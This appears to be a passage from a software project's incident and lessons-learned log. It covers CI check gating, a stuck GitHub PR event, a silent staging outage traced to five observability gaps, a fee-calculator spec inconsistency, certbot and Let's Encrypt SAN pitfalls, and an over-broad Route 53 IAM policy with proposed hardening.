- `e2e-smoke` job gated on `needs.detect-scope.outputs.has_e2e == 'true'`. Currently skipped — will start running when Playwright specs land.
- `format:check` via prettier added to `lint-and-typecheck` (now always required).
- §24.4 "CI Evolution" in CLAUDE.md documents the per-sprint required-check escalation so future check additions don't repeat this drift.

**How to avoid:** The general rule (now §24.5 in CLAUDE.md):

> Every check declared in `ci.yml` must pass on the **current main branch** as-is, not as it will be in two sprints. If a check needs code that doesn't exist yet, gate it via `detect-scope` until the code lands. The PR that adds a check explains which sprint's milestone it represents.

A check that fails because the thing it validates doesn't exist is a broken check, not a strict check — it trains the team to ignore red CI, which is the worst outcome a CI system can produce. Red CI should always mean a real regression.

---

## GitHub PR event delivery stuck — stale mergeability cache after base branch advances

**Status:** RESOLVED 2026-05-16 — observed empirically on PR #36; cleared by merging current `origin/main` into the branch (creates a new merge commit that explicitly references the advanced base).

**Symptom:** After `main` moved past PR #36's `base_sha` via PR #38 merge, GitHub stopped firing `workflow_run` events on new pushes to PR #36 specifically. `mergeable_state: dirty` despite a clean merge tree confirmed via `git merge-tree origin/main origin/feat/...`. Other PRs in the same time window (Dependabot #16, #6) received normal CI triggers. PR #36 specifically had `mergeable: false` cached.

**Why it happens:** GitHub's mergeability calculation is asynchronous and can get wedged when the base branch advances rapidly while a PR is open. Workflow event dispatch appears to wait on the mergeability state being clean; if the cache stays in `dirty` indefinitely, events never fire on subsequent pushes. Not documented behaviour; observed empirically.

**Fix:** Try in order — when one works, stop:

1. `gh pr edit <n> --base main` — no-op base edit to force mergeability recompute. (Did not work for #36.)
2. `gh pr close <n> && gh pr reopen <n>` — full event regeneration via PR open/close. (Did not work for #36.)
3. **`git merge origin/main` into the branch + push** — creates a new merge commit that explicitly references current `main` HEAD; clears both the stale mergeability state AND unsticks event delivery. ✓ This worked. The new merge commit fired CI within seconds.
4. Force-push a rebase — new SHAs bypass stuck state. (Not tried; #3 worked.)
5. Admin-merge with local-CI audit trail — absolute last resort, only when 1-4 all fail.

**How to avoid:** When a long-lived PR has `main` move past its base, proactively `git merge origin/main` into the branch (or rebase + force-push) within the same session to reset the PR's view of the base. Don't let multiple in-flight PRs accumulate with mutually advancing bases — merge in topological order, fastest first. Before opening a new PR, check if any open PRs have `base_sha` older than current `main` HEAD; rebase those first or merge them.

---

## Sprint 2 silent partial-failure pattern — five intersecting observability gaps allowed 5 working days of degraded staging to appear healthy

**Status (2026-05-19):** RESOLVED across PRs #115 + #116 + #117 + the ci.yml e2e-Postgres add-on. Root pattern documented here so it doesn't reform under a different shape.

**Symptom (cumulative, Sprint 2 Days 16–20):** 16+ consecutive Deploy-to-staging workflow runs failed silently across 5 working days. External probes returned 200 throughout. CI on every PR was green. The system appeared healthy from every observation surface a human or workflow ever looked at. The actual state: api was crashed (ERR_MODULE_NOT_FOUND on `@eventpulse/shared-types/dist/bd.js`), Trust Center pages were 404-ing-with-200, env vars were stale on the EC2, and the deploy script was completing-with-rollback-silently-not-firing.

**Why it happens — five intersecting gaps:**

1. **`deploy.sh` race + bare `curl` under `set -euo pipefail`.** Original deploy.sh did a single-shot `curl http://127.0.0.1:4000/health` immediately after `pm2 reload`. `pm2 reload` returns when the process manager has signalled the worker, NOT when the worker is bound to its port. `curl: (7) Failed to connect` exits with code 7. Under `set -euo pipefail`, that exit aborts the entire `deploy.sh` BEFORE the rollback path can fire. So the deploy reports "failed" but the EC2 keeps running whatever the previous (broken) state was. Fixed: PR #115 — `for attempt in 1 2 3 4 5; do … || echo "000"; done` retry loop + explicit `exec rollback.sh` on terminal failure.

2. **Nginx static `/health { return 200 "ok\n"; }` masked api state from external probes.** Both api + web vhosts had `location = /health { return 200 "ok\n"; }` blocks. External monitors hitting `https://api.staging.eventpulse.com.bd/health` got `200 ok` from Nginx regardless of whether Hono was running, crashed, or had never been started. The deploy.sh healthcheck was hitting `http://127.0.0.1:4000` directly so it didn't have this gap — but external probes (UptimeRobot-equivalent monitoring during verification deploys) were lying. Fixed: PR #116 — removed the static `/health` blocks, added `/nginx-health` as the Nginx-direct liveness probe (for distinguishing nginx-down vs app-down). `/health` on api vhost now passes through to Hono. Hono `/health` upgraded to DB-aware (`SELECT 1` via `withSuperAdmin`).

3. **`apps/web/src/lib/legal.ts` silent `catch { return null }` made Trust Center pages 404-with-200.** Server Component fetched Trust Center documents from the api; on api 5xx, the catch returned null; on null, `notFound()` rendered the 404 page; HTTP status was still 200 (Next.js doesn't propagate App Router error states to HTTP status by default for notFound). Fixed: PR #117 — `LegalApiUnavailableError` thrown on network/5xx (Next.js error boundary → 503), `null` returned ONLY for legitimate 404 from api, build-phase short-circuit via `process.env.NEXT_PHASE === 'phase-production-build'` so `next build` doesn't break when api isn't up yet. Plus structured `console.error` JSON envelope captured by PM2 → `/home/eventpulse/logs/web.err.log`.

4. **`bootstrap-staging.sh` env-var bootstrap was a one-shot at Sprint 1 Day 11; never re-run for env vars added Days 12–20.** Each Item that landed between Day 12 and Day 20 added env vars (KYC_BUCKET_NAME, KYC_KMS_KEY_ARN, EPS_* credentials, OAUTH_GOOGLE_*, OAUTH_APPLE_*, PORICHOY_BASE_URL, etc.) to `.env.staging.example` — but the actual `.env.staging` on the EC2 was never re-bootstrapped. The api process started with PARTIAL env vars; Hono framework gracefully boots even with missing env vars (`requireEnv` only throws when the code path that needs the var actually runs). So the api booted, started crashing on every request that hit a code path needing a missing var, and the crashes didn't show up in /health (Nginx static intercept) or in the deploy report (race + bare curl). Fixed at Fix 2 — manual `bootstrap-staging.sh` re-run with all 28 vars; no permanent fix yet for re-bootstrap automation (open carry into Sprint 3).

5. **`packages/shared-types` source-shipping + `.js`-extension imports + no build step → runtime ERR_MODULE_NOT_FOUND on EC2.** packages/shared-types/package.json originally had `main: "./src/index.ts"` + `build: "echo @eventpulse/shared-types is source-only"`. apps/api consumed it via `import { … } from '@eventpulse/shared-types'`. Source-imports worked in CI (Node 22's `--experimental-strip-types` loads .ts on the fly when extensionless or .ts-suffixed) but the index.ts file had `.js` extensions in re-exports (`export … from './bd.js'`) which at RUNTIME on the EC2 resolved to a file that didn't exist — there's no .js file because it was supposed to be source-shipped, but the `.js` extension makes Node's resolver look for a real `.js` file. Fixed: PR #113 (Option B — extensionless re-exports — DIDN'T WORK at runtime) → PR #114 (Option A — real `tsc` build emitting `dist/index.js` + `dist/bd.js`, `.js` extensions in source restored). Plus ci.yml had to add `pnpm --filter @eventpulse/shared-types build` step to 3 direct-filter jobs (api-build, integration-tests, e2e-smoke) — direct-filter bypasses the turbo task graph that would otherwise build deps first.

**The compounding effect (and why nobody noticed):** Gaps 1 + 2 made external probes blind. Gap 3 made Trust Center pages look "fine" (Next.js 404 page is itself a 200). Gap 4 made the api crash on demand rather than at boot. Gap 5 was the actual crash trigger. Each gap on its own would have been noticed within hours. Together they made the system look healthy for 5 working days.

**How to avoid recurrence:**

- **Every probe layer must exercise the actual code path under test.** Nginx `/health` passes through to the app; the app's `/health` exercises the DB; the DB exercises the table grants. Never short-circuit a health probe with a static response unless that probe is explicitly labelled `/nginx-health` or similar and is documented as a layer-specific liveness probe, not a service-level health probe.
- **Deploy scripts must retry health probes and explicitly invoke rollback on failure.** Never trust a single `curl`-after-`reload` shape; processes take time to bind ports. `for attempt in 1..N; do curl … || echo 000; sleep K; done` + explicit `exec rollback.sh` on terminal failure is the canonical shape. `set -euo pipefail` is a tool to surface failures, not to hide them — every external command that can fail benignly must have `|| true` or equivalent.
- **Server Components must throw on backend unavailability, not gracefully fall back.** A 404 page rendered when the actual cause is "api is down" is the worst possible user experience because it teaches the operator that the system is fine when it isn't. `LegalApiUnavailableError` + Next.js error boundary → 503 is the correct shape. The only legitimate `return null` from a service-layer fetch is for a legitimate 404 from the backend (the document genuinely doesn't exist).
- **Env-var bootstrap must re-run on every deploy, not as a one-shot.** Open carry into Sprint 3 — `infra/scripts/bootstrap-staging.sh` should be either folded into `deploy.sh` (idempotent merge of `.env.staging.example` keys into `.env.staging` from Secrets Manager) or wired as a `pm2 reload`-prerequisite hook. Without this, every new env var added in any sprint risks the same "boots fine, crashes on demand" pattern.
- **Workspace packages that consume each other via imports must build their dist before consuming jobs run.** Direct-filter CI jobs bypass the turbo task graph; the dependency build must be an explicit step. The rule: any CI job that runs `pnpm --filter @eventpulse/X build|test|build` and X depends on Y must include `pnpm --filter Y build` as an earlier step.
- **CI must exercise the deployed shape, not the source-shape.** PRs that pass CI but fail at runtime are evidence that CI isn't testing the deployed binary. The api-build, integration-tests, and e2e-smoke jobs now collectively exercise the production-shape: `pnpm --filter shared-types build` → real `dist/` → consumed by downstream filters. Any new workspace package added must be added to all three.

**Open trigger question:** Exactly what change on Day 16 (or shortly after) triggered the shared-types ERR_MODULE_NOT_FOUND? PR #100 (Day 19) added unified-ecosystem deps but didn't touch shared-types. Hypotheses: (a) pnpm-install relinking after unified-ecosystem dep additions changed the resolution of source-shipped `.ts` files; (b) Node version bump from unattended-upgrades changed `--experimental-strip-types` behaviour; (c) some other deploy.sh-internal pnpm flag changed. Not pursued further because Fix 1 (real tsc build) eliminates the entire class of "source-shipping that depends on Node loader behaviour" — but if a future workspace package gets source-shipped again, the trigger investigation may need revisiting.

---

## Spec source-of-truth limits — written worked examples are authoritative for intent, not always for arithmetic

**Status (2026-05-19):** RESOLVED via Decision N (decisions.md 2026-05-19) for §14.2 specifically; the lesson generalises.

**Symptom (Sprint 3 Day 21, fee calculator):** §14.2's four worked examples (Modes A/B/C/D, BDT 1,000 face value, 0.25% platform, 2.5% EPS) define the canonical math the calculator must match. Implementation produced 16/16 internally-consistent cells, of which 14/16 matched §14.2 verbatim — but Mode C `buyer_total` (1,025.00 vs §14.2 primary 1,025.06) + `eps_fee` (25.00 vs §14.2 primary 25.06) differed by 6 paisa each. Investigation revealed §14.2's Mode C primary numbers are arithmetically inconsistent with EPS's stated 2.5% rate (a capture of 1,025.06 at 2.5% yields 25.6265, not 25.06). The spec author wrote Mode C's narrative to make `organiser_net` resolve cleanly to 997.50, working backward from that target rather than from EPS's actual rate. No single arithmetic rule across all 4 modes matches all 4 §14.2 primaries — Mode B explicitly uses `eps_base = subtotal = 1,000` while Mode C primary would require `eps_base = subtotal + platform_fee = 1,002.50`; these are incompatible.

**Why it happens:** Written worked examples are authored to communicate intent — "here's roughly what each fee mode looks like in practice" — and authors commonly work backward from the desired bottom-line number (organiser receives 997.50) without rigorously deriving the intermediate fees through a consistent rule. This is not malice; it's how human-readable spec docs accumulate. Each individual example is locally plausible; only when you implement them as a single consistent function do the cross-example inconsistencies surface.

**Specific pattern: arithmetic inconsistency in §14.2 Mode C.** §14.2 shows "Payment fee 25.06 (or 25.00 depending on which side)" then "EPS captures 1,025.06; settles 1,000.00 net". For EPS to settle 1,000.00 from a 1,025.06 capture while charging 2.5%, EPS would have to keep 25.06 — but 1,025.06 × 2.5% = 25.6265, not 25.06. The spec's parenthetical hedge ("or 25.00 depending on which side") is an unresolved acknowledgement of the tension. Mode A (1,002.50 × 2.5% = 25.0625 → 25.06) and Mode D (1,002.50 × 2.5% = 25.0625 → 25.06) are arithmetically clean; Mode C is the one Mode where the spec author's "work backward from organiser receives X" approach surfaced an inconsistency.

**Fix (Sprint 3 Day 21, PR #119 + Decision N memory PR + §14.2 amendment playbook PR):**

- **Calculator's rule is internally consistent + conservative for the platform.** Single arithmetic rule applies across all 4 modes: `eps_capture_base = subtotal + platform_fee_if_passthrough` else `subtotal`; `eps_fee = floor(eps_capture_base × eps_bps / 10000)`. Matches §14.2 verbatim on Modes A/B/D + matches §14.2's parenthetical alternative on Mode C.
- **§14.2 amended with implementation note** naming the calculator's rule and flagging the empirical gate.
- **Mandatory Day 24-25 EPS sandbox truth gate** — 4 real EPS sandbox transactions verify the calculator's predictions against actual EPS behavior. Any delta is a calculator bug; calculator adjusts, §14.2 re-amends, fee-mode tests re-run.

**How to avoid (the generalised lesson):**

- **For money math (and any other domain where the spec is the contract):** treat written worked examples as authoritative for *intent*, not for *arithmetic*. When implementing, derive the consistent rule that matches the spec's organiser-side / regulator-facing bottom lines (those are the contractually-meaningful numbers); document any cell-level deltas from the spec's stated intermediate numbers; flag them for empirical verification against the actual external system.
- **The external system is the final arbiter.** Where spec and reality disagree, the spec gets amended, not the implementation hidden. Hiding implementation deltas behind opaque code is the path to "platform's math doesn't match documented contract" trust incidents.
- **Empirical verification is non-negotiable for money math.** A spec-derived calculator is a hypothesis until real transactions confirm it. Schedule the verification step explicitly (Day 24-25 truth gate); make it a hard gate, not a "we'll get to it"; make it precede any code that depends on the calculator's correctness (Day 26 sandbox-order work).
- **Conservatism is a tiebreaker, not a substitute for verification.** When two interpretations are consistent with the spec, picking the one that's conservative for the platform (the platform absorbs the delta, not the buyer or organiser) buys time for empirical verification without creating customer-visible surprises. But the verification still has to happen.
- **The Sprint 2 silent-failure pattern's lesson applies here too:** "observability of system state must come from probes that exercise the actual code paths under test, not from layer-of-abstraction shortcuts." For money math, the "code path" is the EPS gateway; the "probe" is the sandbox transaction. Skipping the empirical probe and trusting the spec verbatim is the same anti-pattern at a different layer.

**Cross-references:** Decision N (decisions.md 2026-05-19) "Fee calculator EPS-base rule locked + mandatory Day 24-25 EPS sandbox truth gate"; §14.2 amendment in CLAUDE.md (playbook PR); progress.md "Day 24-25 — Landing page + ticket tier CRUD + MANDATORY EPS sandbox truth gate".

---

## Let's Encrypt rejects SAN lists with both a wildcard and the names it would cover

**Status (2026-05-20):** RESOLVED for Decision O.1 staging cert; remains a general LE policy.

**Symptom:** First `certbot certonly --expand` attempt at Sprint 3 Day 22 included the existing 5 SANs (`staging`, `admin/api/app/my.staging.eventpulse.com.bd`) PLUS the new wildcard `*.staging.eventpulse.com.bd`. LE rejected at request-submit time:

```text
Error creating new order :: Domain name "admin.staging.eventpulse.com.bd" is
redundant with a wildcard domain in the same request. Remove one or the other
from the certificate request.
```

The cert was NOT modified (LE atomic-swap behaviour preserved the existing 5-SAN cert).

**Why it happens:** LE policy disallows SAN lists where a wildcard and the names it would cover both appear. The wildcard already provides TLS coverage for any one-label-deep subdomain; explicit duplicates add no security value and complicate cert lifecycle (multiple paths to the same name). The rejection is at the ACME API layer, not certbot — no pre-flight check exists on the certbot side. It surfaces only when LE evaluates the new-order request.

**Fix:** Correct SAN list for "apex + wildcard" coverage is exactly **2 SANs**:

- the apex name itself (e.g. `staging.eventpulse.com.bd`) — required because wildcards do not cover the apex per RFC 6125 §6.4.3 (wildcards match exactly one DNS label, left-most)
- the wildcard (e.g. `*.staging.eventpulse.com.bd`) — covers all single-label subdomains

Single-label subdomains (`admin.staging.eventpulse.com.bd` etc.) are NOT listed explicitly; they're matched by the wildcard via standard RFC 6125 TLS client behaviour.

**How to avoid:** When designing a wildcard cert request, the SAN list is always `apex + *` (or just the wildcard if the apex isn't needed). Never enumerate subdomains the wildcard would cover. The auditability concern this raises (cert SAN list is less explicit) is real but the answer is to shift audit surfaces to DNS records and Nginx vhost configs (which are stronger audit surfaces anyway — see Decision O.1 rationale).

---

## certbot `--expand` requires the new SAN set to be a strict superset of the existing one

**Status (2026-05-20):** RESOLVED for Decision O.1 staging cert; remains a general certbot semantic.

**Symptom:** Second `certbot certonly --expand` attempt at Sprint 3 Day 22 dropped the 4 redundant subdomains, requesting just `staging.eventpulse.com.bd` + `*.staging.eventpulse.com.bd`. Command succeeded BUT created a sibling lineage with `-0001` suffix:

```text
Successfully received certificate.
Certificate is saved at: /etc/letsencrypt/live/staging.eventpulse.com.bd-0001/fullchain.pem
This certificate expires on 2026-08-17.
```

The existing lineage `staging.eventpulse.com.bd` remained at its 5-SAN cert (no change). The new lineage `-0001` was orphaned (no Nginx vhost referencing it). The TLS regression checks the brief mandated would have returned HTTP 200 + SSL 0 for ALL probes — but for the wrong reason, since they'd be hitting Nginx still serving the old cert.

**Why it happens:** `certbot --expand` is specifically designed for ADDING names to an existing cert lineage. It requires the new `-d` list to be a strict superset of the existing lineage's SAN set. Going from 5 SANs to 2 SANs (where 4 of the originals are now wildcard-covered but no longer explicitly listed) is NOT a superset relationship — it's a different SAN set. certbot interprets this as a different cert request and disambiguates by creating a new sibling lineage with a `-NNNN` suffix.

**Fix:** For SAN-set replacements (where some names are removed AND others added), drop `--expand` AND add `--cert-name <existing-lineage-name>` to pin certbot to the existing lineage. Optionally add `--force-renewal` defensively (certbot may complain that the existing cert is "still valid" otherwise — `--force-renewal` overrides).

Recovery if the orphan was already created:

```bash
sudo certbot delete --non-interactive --cert-name <orphan-name>  # e.g. staging.eventpulse.com.bd-0001
sudo certbot certonly --dns-route53 --non-interactive --force-renewal \
  --cert-name <existing-lineage> \
  -d <existing-lineage> -d '*.<wildcard>'
```

After reissue, run `sudo systemctl reload nginx` to pick up the new cert content (even though the file path is unchanged, Nginx workers cache cert content in memory).

**How to avoid:** Default to `--cert-name <existing>` whenever the operation modifies an existing lineage's SAN set in any direction. Use `--expand` ONLY when the change is strictly additive. Symptom check: certbot's "Certificate is saved at:" line should match the existing lineage path; if it has a `-NNNN` suffix, certbot disambiguated.

---

## Nginx vhost configs hardcode the cert lineage path — treat the lineage name as contractual

**Status (2026-05-20):** RESOLVED via Decision O.1; principle applies to all future cert ops.

**Symptom:** When certbot creates a sibling lineage `staging.eventpulse.com.bd-0001` (per the `--expand` gotcha above), Nginx continues serving from the original lineage path `/etc/letsencrypt/live/staging.eventpulse.com.bd/...`. The new cert is on disk but invisible to TLS clients. External probes return success for the wrong reason. Worse: a future "let's rename the new lineage" or "delete the old lineage" operation requires a Nginx vhost edit + reload.

**Why it happens:** Nginx vhost configs use literal cert paths (`ssl_certificate /etc/letsencrypt/live/<lineage-name>/fullchain.pem`). The `<lineage-name>` is part of the path; changing it requires a config edit. Certbot's cert renewal process keeps the file path stable across renewals of the SAME lineage — but creating a different lineage breaks the implicit path contract.

**Fix:** Every cert operation that touches an existing lineage MUST use `--cert-name <existing>` to pin the operation to that lineage's path. Treat the lineage name as **contractual** — any operation that would change the lineage name (or create a sibling lineage) requires a coordinated Nginx vhost edit + PR + deploy.

**How to avoid:** Document the lineage name → vhost path mapping (Sprint 1 cert lineage `staging.eventpulse.com.bd` → 4 Nginx vhost references in `infra/nginx/eventpulse-staging.conf`). When proposing a cert operation, identify the lineage name first, then pin certbot to it. If the operation would create a sibling lineage, surface the implication (Nginx vhost edit required) before running the command.

---

## Let's Encrypt account registered without email — silent expiration risk

**Status (2026-05-20):** ACKNOWLEDGED Sprint 3 Day 22; mitigation deferred to Sprint 3 closeout or Sprint 4.

**Symptom:** `certbot show_account` against the Sprint 1 LE account on staging EC2 returns:

```text
Account URL: https://acme-v02.api.letsencrypt.org/acme/acct/3342182286
Account Thumbprint: 5DZr2APdwelNxkcIdxjeliovYAqJqqkIugV9uFgnmtM
Email contact: none
```

LE sends expiration warning emails (typically 20, 10, 1 days before expiry) to the registered email. With "none" as the contact, the platform receives NO expiration warnings from LE. Cert auto-renewal via certbot.timer is the only renewal mechanism; if the timer is misconfigured, disabled, or the renewal hooks fail silently, the cert expires without warning.

**Why it happens:** Original Sprint 1 Day 3-4 `certbot register` was either run without `--email` OR with `--register-unsafely-without-email`. The §17.7 staging command in CLAUDE.md DOES include `--email moshiur@publicpulse.com.bd` but `--email` only applies to NEW account registration; if the account already existed (or was created via a different command), the email arg is silently ignored.

**Mitigations (Sprint 3 closeout or Sprint 4):**

1. **Register email post-hoc:** `sudo certbot register --update-registration --email <ops-email>` (or `certbot update_account --email <ops-email>` in newer certbot). One-time fix; LE warnings then flow to the registered inbox.
2. **External cert-expiry monitoring:** CloudWatch metric on `(cert-not-after-timestamp - now())` from a periodic script (e.g. `openssl x509 -enddate -noout -in fullchain.pem`); alarm at <14 days. Tighter SLA than LE's 20/10/1-day warning cadence; doesn't depend on the LE account having an email at all.
3. **Verify `certbot.timer` is active:** `sudo systemctl status certbot.timer` should show `Active: active (waiting)`. If `inactive` or `disabled`, auto-renewal isn't running and certs WILL expire silently.

**How to avoid in future cert work:** When provisioning a new LE account, always pass `--email <ops-shared-inbox>` AND verify post-registration with `certbot show_account`. When a new ops mailbox lands (e.g. `security@eventpulse.com.bd` once SES inbound is configured Sprint 3+), update the account email at that time.

---

## IAM policy SID is aspirational — Route 53 ACME role has whole-zone CRUD

**Status (2026-05-20):** ACKNOWLEDGED Sprint 3 Day 22; hardening deferred to Sprint 4 production cutover.

**Symptom:** EC2 staging role `eventpulse-staging-ec2` carries inline policy `eventpulse-staging-acme-route53` with SID `Route53AcmeTxtRecordsInZone` — name implies ACME challenge TXT records only. Actual policy grant:

```json
{
  "Sid": "Route53AcmeTxtRecordsInZone",
  "Effect": "Allow",
  "Action": ["route53:ChangeResourceRecordSets", "route53:ListResourceRecordSets"],
  "Resource": "arn:aws:route53:::hostedzone/Z003493917KJX7VCR8ZMR"
}
```

No `Condition` block, no record-name scoping. The EC2 staging role has standing authority to mutate ANY record (A, AAAA, MX, TXT, CNAME, ...) in the shared `eventpulse.com.bd.` hosted zone — including future production records that will share the same zone.

**Why it happens:** SID is a free-text identifier; AWS does not enforce semantic alignment between SID names and the actual grant. The Sprint 1 Day 3-4 setup wrote the SID as documentation intent ("this policy is for ACME challenges") but the underlying grant was whole-zone for simplicity. The blast-radius implications surfaced only when Day 22 verification scrutinised the policy doc.

**Why it's not Sprint 3 blocking:** The EC2 staging role is constrained to the staging EC2 instance only (IAM trust policy ties it to that instance ID). An attacker would need EC2-level access (RCE on the staging api, escalation to instance metadata, IMDSv2 token exfiltration) to leverage this; if they have that, they already have a lot. Staging-only blast radius is bounded by the staging environment's overall trust model.

**Mitigations (Sprint 4 production cutover):**

1. **Tighten with `Condition: StringLike` on record names** scoped to ACME challenge patterns:

   ```json
   "Condition": {
     "ForAllValues:StringLike": {
       "route53:ChangeResourceRecordSetsActions": ["UPSERT", "DELETE"],
       "route53:ChangeResourceRecordSetsRecordTypes": ["TXT"],
       "route53:ChangeResourceRecordSetsNormalizedRecordNames": [
         "_acme-challenge.*.staging.eventpulse.com.bd",
         "_acme-challenge.staging.eventpulse.com.bd"
       ]
     }
   }
   ```

   Equivalent for the future prod role, scoped to `_acme-challenge.*.eventpulse.com.bd` + `_acme-challenge.eventpulse.com.bd`.

2. **Separate hosted zones for staging vs prod** as part of the Sprint 4 prod cutover. Zone-level isolation is a stronger blast-radius boundary than IAM condition scoping (defense in depth).

3. **Rename the SID** to reflect actual grant (`Route53ChangeResourceRecordSetsInZone`) so it stops being a documentation lie.

**How to avoid in future IAM work:** When writing an inline policy, verify the SID semantics match the grant semantics. SID names that imply a narrower scope than the policy enforces are documentation rot waiting to surface during a security review.
